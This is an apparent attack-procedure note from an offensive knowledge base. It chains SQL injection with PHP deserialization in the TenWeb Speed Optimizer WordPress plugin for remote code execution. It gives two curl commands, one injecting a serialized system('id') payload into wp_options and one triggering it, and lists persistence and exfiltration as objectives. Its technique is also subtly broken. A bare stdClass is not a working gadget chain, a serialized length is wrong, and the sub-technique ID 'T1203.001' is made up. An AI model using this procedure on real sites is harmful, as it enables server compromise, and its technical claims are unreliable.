---
tags:
  - rce
  - deserialization
  - php
  - wordpress
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/inject-serialized-payload]]'
  - '[[commands/trigger-deserialization]]'
verified: false
platforms:
  - Web
  - WordPress
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T03:15:09.873Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques:
  - '[[T1203.001]]'
id: ed6d3f3b-8eba-478a-8c1c-98544a6c0902
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
---

# Chain-SQLi-with-Insecure-Deserialization-for-RCE

## Summary

This procedure chains the SQL injection vulnerability with an insecure deserialization flaw in the TenWeb Speed Optimizer plugin to achieve remote code execution, allowing arbitrary PHP code to run on the server.

## Description

After gaining database access via SQLi, the attacker updates a serialized data field with a malicious gadget chain (e.g., using PHP's unserialize on untrusted input). When the plugin processes this data, it deserializes the payload, executing code like system commands. This targets PHP-based WordPress environments and leads to full server compromise.

## Requirements

1. Successful SQLi exploitation from prior procedure
2. Knowledge of vulnerable database tables storing serialized objects
3. PHP gadget chains for deserialization (e.g., stdClass with exec property)

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all deserialized inputs; avoid unserialize on user data
- Apply plugin patches (update to 2.12.22 or later)
- Monitor for unexpected PHP execution in logs or file changes

## Objectives

1. Inject and trigger malicious serialized payloads
2. Execute arbitrary code on the server
3. Maintain persistence or exfiltrate data

## Instructions

### Step 1: Inject Malicious Serialized Payload via SQLi

**Context**: Use SQLi to update a database field with a crafted serialized object that will execute code upon deserialization.

**Command** ([[commands/inject-serialized-payload]]):
```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=\' ; UPDATE wp_options SET option_value=\'O:8:\"stdClass\":1:{s:4:\"exec\";s:14:\"system(\\\"id\\\")\";}\' WHERE option_name=\'vulnerable_option\' --' -H 'Content-Type: application/json'
```

> This updates a serialized field with a payload that calls system('id'). Expected output: Success confirmation from database update.

### Step 2: Trigger Deserialization

**Context**: Interact with the plugin to process the tainted data, triggering unserialize and code execution.

**Command** ([[commands/trigger-deserialization]]):
```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=trigger_option' -H 'Content-Type: application/json'
```

> This request causes the plugin to load and deserialize the injected data. Expected output: Response includes output from executed command, e.g., 'uid=33(www-data) gid=33(www-data)'.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation for Client Execution]]

### Sub-Techniques

- [[T1203.001]]

## Commands Used

- [[commands/inject-serialized-payload]]
- [[commands/trigger-deserialization]]

## Tools Used

- [[tools/curl]]

## Tags

- rce
- deserialization
- chaining

